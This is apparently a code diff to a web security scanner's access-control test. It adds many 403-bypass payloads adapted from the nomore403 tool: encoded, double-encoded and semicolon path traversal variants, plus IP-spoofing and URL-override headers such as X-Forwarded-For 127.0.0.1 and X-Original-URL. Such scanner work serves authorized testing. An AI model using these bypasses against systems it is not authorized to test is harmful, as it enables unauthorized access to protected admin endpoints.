@@ -1500,6 +1500,31 @@ _PATH_BYPASS_STRATEGIES = [
     lambda p: p.replace("/admin", "/admin..%00/"),        # null in traversal
     lambda p: p.replace("/admin", "/admin%0d/"),          # CR bypass
     lambda p: p.replace("/admin", "/.%2e/admin"),         # mixed encoding traversal
+    # --- nomore403: End-path bypasses ---
+    lambda p: p.replace("/admin", "/admin?debug=true"),   # debug param bypass
+    lambda p: p.replace("/admin", "/admin.svc"),          # WCF service extension
+    lambda p: p.replace("/admin", "/admin.wsdl"),         # WSDL descriptor
+    lambda p: p.replace("/admin", "/admin?WSDL"),         # WSDL query bypass
+    lambda p: p.replace("/admin", "/admin%2500"),         # double-encoded null byte
+    lambda p: p.replace("/admin", "/admin..;"),           # semicolon traversal suffix
+    lambda p: p.replace("/admin", "/admin.css"),          # static file extension bypass
+    lambda p: p.replace("/admin", "/admin.html"),         # HTML extension bypass
+    lambda p: p.replace("/admin", "/admin/*"),            # wildcard bypass
+    lambda p: p.replace("/admin", "/admin/..%3B/"),       # encoded semicolon traversal
+    # --- nomore403: Mid-path bypasses (most creative/unique) ---
+    lambda p: p.replace("/admin", "/%2f/admin"),          # encoded slash prefix
+    lambda p: p.replace("/admin", "/%252f/admin"),        # double-encoded slash mid-path
+    lambda p: p.replace("/admin", "/../;/admin"),         # traversal + semicolon combo
+    lambda p: p.replace("/admin", "/..%252F/admin"),      # double-encoded traversal slash
+    lambda p: p.replace("/admin", "/%3b/admin"),          # encoded semicolon prefix
+    lambda p: p.replace("/admin", "/%3b%2f..%2f/admin"),  # encoded ;/../
+    lambda p: p.replace("/admin", "/%2f%3b%2f/admin"),    # encoded /;/
+    lambda p: p.replace("/admin", "/%2e%2e/admin"),       # fully encoded ../
+    lambda p: p.replace("/admin", "/..%00/admin"),        # null byte in traversal
+    lambda p: p.replace("/admin", "/..%0d/admin"),        # CR in traversal
+    lambda p: p.replace("/admin", "/%252e%252e/admin"),   # double-encoded .. prefix
+    lambda p: p.replace("/admin", "/%252f%252f/admin"),   # double-encoded // prefix
+    lambda p: p.replace("/admin", "/..\\.\\admin"),       # backslash traversal (IIS/Windows)
 ]
 
 
@@ -1586,11 +1611,11 @@ async def test_broken_access(
                             })
                             break
 
-            # Strategy 3: Header-based 403 bypass (byp4xx-style)
-            _BYPASS_HEADERS = [
-                {"X-Original-URL": "/admin"},
-                {"X-Rewrite-URL": "/admin"},
+            # Strategy 3: Header-based 403 bypass (byp4xx-style + nomore403)
+            # Static IP-spoofing headers (same for every endpoint)
+            _BYPASS_HEADERS_STATIC = [
                 {"X-Custom-IP-Authorization": "127.0.0.1"},
+                # --- IP-spoofing headers ---
                 {"X-Forwarded-For": "127.0.0.1"},
                 {"X-Real-IP": "127.0.0.1"},
                 {"X-Originating-IP": "127.0.0.1"},
@@ -1600,14 +1625,58 @@ async def test_broken_access(
                 {"X-Client-IP": "127.0.0.1"},
                 {"X-Host": "127.0.0.1"},
                 {"X-Forwarded-Host": "localhost"},
-                {"Referer": "/admin"},
+                # --- nomore403: Cloudflare / proxy IP headers ---
+                {"CF-Connecting-IP": "127.0.0.1"},
+                {"CF-Connecting_IP": "127.0.0.1"},
+                {"True-Client-IP": "127.0.0.1"},
+                {"Cluster-Client-IP": "127.0.0.1"},
+                {"Client-IP": "127.0.0.1"},
+                {"X-Original-Remote-Addr": "127.0.0.1"},
+                {"X-True-IP": "127.0.0.1"},
+                {"Real-Ip": "127.0.0.1"},
+                # --- nomore403: Forwarding chain headers ---
+                {"Forwarded": "for=127.0.0.1"},
+                {"Forwarded-For": "127.0.0.1"},
+                {"X-Forward-For": "127.0.0.1"},
+                {"X-Forwarded-By": "127.0.0.1"},
+                {"X-Forwarded-For-Original": "127.0.0.1"},
+                {"X-Forwarder-For": "127.0.0.1"},
+                {"X-Originally-Forwarded-For": "127.0.0.1"},
+                {"X-Forwarded-Server": "127.0.0.1"},
+                # --- nomore403: Misc static headers ---
+                {"X-HTTP-Host-Override": "localhost"},
+                {"Proxy-Host": "127.0.0.1"},
+                {"Proxy": "127.0.0.1"},
+                {"X-Forwarded-Proto": "https"},
+                {"X-WAP-Profile": "http://127.0.0.1/wap.xml"},
+                {"X-Arbitrary": "127.0.0.1"},
+                {"Origin": "http://127.0.0.1"},
             ]
             for endpoint in endpoints:
                 get_status, _, _ = await _send(session, endpoint)
                 if get_status not in (401, 403):
                     continue
 
-                for bypass_hdr in _BYPASS_HEADERS:
+                # Build dynamic path-override headers per endpoint
+                _ep_path = urlparse(endpoint).path or "/"
+                _bypass_headers = _BYPASS_HEADERS_STATIC + [
+                    {"X-Original-URL": _ep_path},
+                    {"X-Rewrite-URL": _ep_path},
+                    {"Referer": _ep_path},
+                    {"Destination": _ep_path},
+                    {"Request-Uri": _ep_path},
+                    {"X-HTTP-DestinationURL": _ep_path},
+                    {"X-Proxy-Url": _ep_path},
+                    {"Proxy-Url": _ep_path},
+                    {"Redirect": _ep_path},
+                    {"Base-Url": _ep_path},
+                    {"Http-Url": _ep_path},
+                    {"Profile": _ep_path},
+                    {"Uri": _ep_path},
+                    {"Url": _ep_path},
+                ]
+
+                for bypass_hdr in _bypass_headers:
                     status, body, _ = await _send(
                         session, endpoint, headers=bypass_hdr,
                     )
